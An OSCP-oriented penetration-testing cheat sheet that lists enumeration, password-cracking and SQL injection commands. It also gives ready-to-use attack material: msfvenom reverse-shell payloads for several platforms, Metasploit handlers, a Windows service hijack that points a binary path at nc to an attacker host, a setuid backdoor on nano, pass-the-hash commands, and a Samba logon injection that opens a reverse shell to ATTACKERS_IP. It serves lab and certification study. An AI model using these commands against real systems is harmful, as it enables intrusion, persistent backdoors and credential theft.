----------------------------------------------------------------------------------------------------------------------
Prep
----------------------------------------------------------------------------------------------------------------------
**Basic infra** - https://github.com/rapid7/metasploitable3
**Basic web** - https://www.owasp.org/index.php/OWASP_Broken_Web_Applications_Project
**OSCP like VMs** - https://www.vulnhub.com/

----------------------------------------------------------------------------------------------------------------------
Enumeration
----------------------------------------------------------------------------------------------------------------------

**1. Nmap basic scan**
----------------------------------------------------------------------------------------------------------------------
* nmap -sn /24    (Identify targets in subnet)

* nmap -sS -p- -T4 -Pn -vv <IP_ADDRESS>    (TCP scan)

* nmap -sU -p- -T4 -Pn -vv <IP_ADDRESS>    (UDP scan)
   
* nc -nv <IP_ADDRESS> <PORT_NUM>     (Grab banners manually for more clarity) 

* --source-port <PORT_NUM> // -S <IP_Address>    (Spoof)

* nmap -sS -sV -Pn -T4 -vv -D <FAKE_IP_ADDRESS> <TARGET>     (TCP Decoy) 
   
* nmap -sU -sV -Pn -T4 -vv -D <FAKE_IP_ADDRESS> <TARGET>     (UDP Decoy)

* Refer to https://nmap.org/book/man-bypass-firewalls-ids.html in order to evade firewall.



**2. Nmap script and vulnerability Scan**
----------------------------------------------------------------------------------------------------------------------

* nmap -Pn -sV -A -pT:{TCP ports found in step 1},U:{UDP ports found in step 1} -script vuln <IP_ADDRESS>



**3. Any web port(s) for further enumeration?**
----------------------------------------------------------------------------------------------------------------------
* nikto -Display V -host <IP_ADDRESS> -port <PORTS_NUMS> -Tuning x 6 -o ~/Desktop/<IP_ADDRESS>/Nikto_Output.html -Format html

* **Nikto CMDs at https://cirt.net/nikto2-docs/options.html#id2741238**
   
* Fuzz directories using ZAP  (/usr/share/secLists/Discovery folder that has some great wordlists for this)

* fimap -u <TARGET>     (If you see any LFI/RFI vulnerability posted by Nikto)



**4. Are there any exploits available publicly from the services discovered from Step 2?**
----------------------------------------------------------------------------------------------------------------------
* searchsploit <service name>

* http://www.securityfocus.com/vulnerabilities

Copy exploit to local dir: searchsploit -m <ID>
   
* **Precompiled windows exploits** - https://github.com/abatchy17/WindowsExploits
* **Windows kernel exploits** - https://github.com/SecWiki/windows-kernel-exploits
* **Linux kernel exploits** - https://github.com/SecWiki/linux-kernel-exploits

**5. Manual Poking for Web Pages**
----------------------------------------------------------------------------------------------------------------------
Check the Page Source, Inspect elements, view cookies, tamper data, use curl/wget

    Google alien terms!
    Anything sensitive there?
    Any version info?

Search repository online (like GitHub) if the application used is open source: this may assist in site enumeration and guessing versions etc.!

Check HTTP Options

Check for Input Validation in forms (like: 1′ or 1=1 limit 1;#   AND   1′ or 1=1–)

    NULL or null
        Possible error messages returned.
    ‘ , ” , ; , <!
        Breaks an SQL string or query; used for SQL, XPath and XML Injection tests.
    – , = , + , ”
        Used to craft SQL Injection queries.
    ‘ , &, ! , ¦ , < , >
        Used to find command execution vulnerabilities.
    ../
        Directory Traversal Vulnerabilities.

**6. Are there any NETBIOS, SMB, RPC ports discovered from Step 1?**
----------------------------------------------------------------------------------------------------------------------
enum4linux -a <ip address> **(For more info - https://labs.portcullis.co.uk/tools/enum4linux/)**

Rpcclient <ip address> -U “” -N **(For more info - https://attackerkb.com/Windows/rpcclient)**

Rpcinfo: What services are running? Rpcinfo -p <target ip>

Is portmapper running? Is rlogin running? Or NFS or Mountd?

http://etutorials.org/Networking/network+security+assessment/Chapter+12.+Assessing+Unix+RPC+Services/12.2+RPC+Service+Vulnerabilities/

Showmount -e <ip address>/<port>

Can you mount the smb share locally?

Mount -t cifs //<server ip>/<share> <local dir> -o username=”guest”,password=””

Rlogin <ip-address>

Smbclient -L \\<ip-address> -U “” -N

Nbtscan -r <ip address>

Net use \\<ip-address>\$Share “” /u:””

Net view \\<ip-address>

Check NMAP Scripts for SMB, DCERPC and NETBIOS

**7. Any SMTP ports available?**
----------------------------------------------------------------------------------------------------------------------
**Recommended wordlists at /usr/share/metasploit-framework/data/wordlists & /usr/share/seclists/Usernames**


**Enumerate commands (nmap -A does this scan if port is open in step 2)**
* nmap --script smtp-commands.nse [--script-args smtp-commands.domain=<domain>] -pT:25,465,587 <IP_ADDRESS>

**verify if username exists**
* smtp-user-enum -M VRFY -U <WORDLIST_PATH> -t <IP_ADDRESS>
 
**verify if username is valid**
* smtp-user-enum -M EXPN -U <WORDLIST_PATH> -t <IP_ADDRESS>

**8. How about SNMP ports?**
----------------------------------------------------------------------------------------------------------------------
Default Community Names: public, private, cisco, manager

Enumerate MIB:

1.3.6.1.2.1.25.1.6.0 System Processes

1.3.6.1.2.1.25.4.2.1.2 Running Programs

1.3.6.1.2.1.25.4.2.1.4 Processes Path

1.3.6.1.2.1.25.2.3.1.4 Storage Units

1.3.6.1.2.1.25.6.3.1.2 Software Name

1.3.6.1.4.1.77.1.2.25 User Accounts

1.3.6.1.2.1.6.13.1.3 TCP Local Ports

Use tools:

Onesixtyone – c <community list file> -I <ip-address>

Snmpwalk -c <community string> -v<version> <ip address>

Eg: enumerating running processes:

root@kali:~# snmpwalk -c public -v1 192.168.11.204 1.3.6.1.2.1.25.4.2.1.2

**9. FTP Ports Discovered**
----------------------------------------------------------------------------------------------------------------------
Is anonymous login allowed?

If yes, is directory listing possible? Can a file be ‘get’ or ‘send’?

Use browser: ftp://<ip-address> , What do you find?

**10. Password Cracking / Brute Forcing**
----------------------------------------------------------------------------------------------------------------------
Try this as the last resort or in case the Passwd/Shadow/SAM files are in possession:

For linux, first combine passwd & shadow files:  unshadow [passwd-file] [shadow-file] > unshadowed.txt

Then, use John on the unshadowed file using a wordlist or rules mangling : john –rules –wordlist=<wordlist file> unshadowed.txt

Identifying Hash: hash-identifier

For other services, use Medusa or Hydra. Eg:

Hydra -L <username file> -P <Password file> -v <ip-address> ssh

Medusa -h <ip-address> -U <username file> -P <password file> -M http -m DIR:/admin -T 30

Using hashcat for cracking hashes:

For WordPress MD5 with salt: hashcat -m 400 -a 0 <hash file> <wordlist file>

Sample Password list: /usr/share/wordlist/rockyou.txt

**11. Packet Sniffing**
----------------------------------------------------------------------------------------------------------------------
Use Wireshark / tcpdump to capture traffic on the target host:

“tcpdump -i tap0  host <target-ip> tcp port 80 and not arp and not icmp -vv”

**12. SSH
----------------------------------------------------------------------------------------------------------------------
https://www.digitalocean.com/community/tutorials/ssh-essentials-working-with-ssh-servers-clients-and-keys


----------------------------------------------------------------------------------------------------------------------
Payload generation
----------------------------------------------------------------------------------------------------------------------
 **List payloads**

msfvenom -l

**Binaries:**
----------------------------------------------------------------------------------------------------------------------
**Linux**

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf

**Windows**

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe

**Mac**

msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho

**Web Payloads:**
----------------------------------------------------------------------------------------------------------------------
**PHP**

msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

**ASP**

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp

**JSP**

msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp

**WAR**

msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war

**Scripting Payloads**
----------------------------------------------------------------------------------------------------------------------
**Python**

msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py

**Bash**

msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh

**Perl**

msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl

**Shellcode**

For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.

**Linux Based Shellcode**

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>

**Windows Based Shellcode**

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>

**Mac Based Shellcode**

msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>

**Handlers**
----------------------------------------------------------------------------------------------------------------------
Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.

use exploit/multi/handler
set PAYLOAD <Payload name>
set LHOST <LHOST value>
set LPORT <LPORT value>
set ExitOnSession false
exploit -j -z

Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r ‘

----------------------------------------------------------------------------------------------------------------------
TTY Shells
----------------------------------------------------------------------------------------------------------------------
**Tips / Tricks to spawn a TTY shell from a limited shell in Linux, useful for running commands like su from reverse shells.**
----------------------------------------------------------------------------------------------------------------------

**Python TTY Shell Trick**

python -c 'import pty;pty.spawn("/bin/bash")'

echo os.system('/bin/bash')

**Spawn Interactive sh shell**

/bin/sh -i

**Spawn Perl TTY Shell**

exec "/bin/sh";
perl —e 'exec "/bin/sh";'

**Spawn Ruby TTY Shell**

exec "/bin/sh"

**Spawn Lua TTY Shell**

os.execute('/bin/sh')

**Spawn TTY Shell from Vi**

Run shell commands from vi:

:!bash

**Spawn TTY Shell NMAP --interactive**

!sh

----------------------------------------------------------------------------------------------------------------------
Privilege Escalation
----------------------------------------------------------------------------------------------------------------------
**Windows:** 

* http://www.bhafsec.com/wiki/index.php/Windows_Privilege_Escalation

* Accesschk stuff
accesschk.exe /accepteula (first thing to do in CLI access)
accesschk.exe /accepteula -uwcqv "Authenticated Users" * (won't yield anything on Win 8)
accesschk.exe /accepteula -ucqv <SERVICE_NAME>
sc qc <SERVICE_NAME>
sc config <SERVICE_NAME> binpath= "C:\<NC.EXE_PATH> -nv <LHOST> <LPORT> -e C:\WINDOWS\System32\cmd.exe"
sc config <SERVICE_NAME> obj= ".\LocalSystem" password= ""
sc config <SERVICE_NAME> start= auto
net start <SERVICE_NAME>

**Linux:**

* LinEnum
http://www.rebootuser.com/?p=1758
This tool is great at running through a heap of things you should check on a Linux system in the post exploit process. This include file permissions, cron jobs if visible, weak credentials etc. The first thing I run on a newly compromised system.

* LinuxPrivChecker
http://www.securitysift.com/download/linuxprivchecker.py
This is a great tool for once again checking a lot of standard things like file permissions etc. The real gem of this script is the recommended privilege escalation exploits given at the conclusion of the script. This is a great starting point for escalation.

* g0tmi1k’s Blog
http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
Not so much a script as a resource, g0tmi1k’s blog post here has led to so many privilege escalations on Linux system’s it’s not funny. Would definitely recommend trying out everything on this post for enumerating systems. 

----------------------------------------------------------------------------------------------------------------------
Transferring files
----------------------------------------------------------------------------------------------------------------------
* https://blog.ropnop.com/transferring-files-from-kali-to-windows/

----------------------------------------------------------------------------------------------------------------------
SSH Tunneling
----------------------------------------------------------------------------------------------------------------------
* https://chamibuddhika.wordpress.com/2012/03/21/ssh-tunnelling-explained/

----------------------------------------------------------------------------------------------------------------------
Backdooring
----------------------------------------------------------------------------------------------------------------------
* setuid bit combina (root permissions required) - https://gist.github.com/dergachev/7916152
   * ls -al /bin/nano       #    -rwxr-xr-x 1 root root 191976 2010-02-01 20:30 /bin/nano
   * chmod u+s /bin/nano    # installs the backdoor
   
----------------------------------------------------------------------------------------------------------------------
SQL Injection
----------------------------------------------------------------------------------------------------------------------
**Examples**
* Boolean Blind SQL Injection - https://www.youtube.com/watch?v=4LM_EIehbsU
* Time Based SQL Injection - https://www.youtube.com/watch?v=mphLv1ZCMf8 
* /*/bWAPP/sqli_5.php?title=The+Dark+Knight+Rises'-if(length(database())%3d'5',sleep(5),1)%23&action=go

**Cheat Sheets:**
* https://websec.ca/kb/sql_injection#MSSQL_Default_Databases
* http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
* https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md

----------------------------------------------------------------------------------------------------------------------
More useful info
----------------------------------------------------------------------------------------------------------------------
* https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
* https://github.com/chouaibhm/OSCP-Survival-Guide-1/blob/master/OSCP_Helpful_Links.md


----------------------------------------------------------------------------------------------------------------------
**More**
----------------------------------------------------------------------------------------------------------------------
* sort <WORDLIST_PATH> | uniq          (Outputs unique words in a wordlist that is found)
* sort <WORDLIST_PATH> | uniq | wc -l  (sorts number of unique words in a wordlist that is found)

* ip -4 addr show scope global    /*Determine interfaces ip address + prefix*/
* ip route show | grep default    /*Determine which interface is public*/

**CME**
* crackmapexec smb <TARGET/S> -u <LOCAL_USER_NAME> -H <XXX_LMHASH_XX>:<XXX_NTHASH_000> --local (PTH local creds) 
* crackmapexec smb <TARGET/S> -u '' -p '' (NULL Sessions)
* cmedb - creds/hosts (show results)

**SMBclient**
* smbclient '\\<TARGET_IP>\<Share>'
* smb: \> logon "/='nc <ATTACKERS_IP> <ATTACKERS_PORT> -e /bin/bash'"


-----------------------------------------------------------------------------------------------------

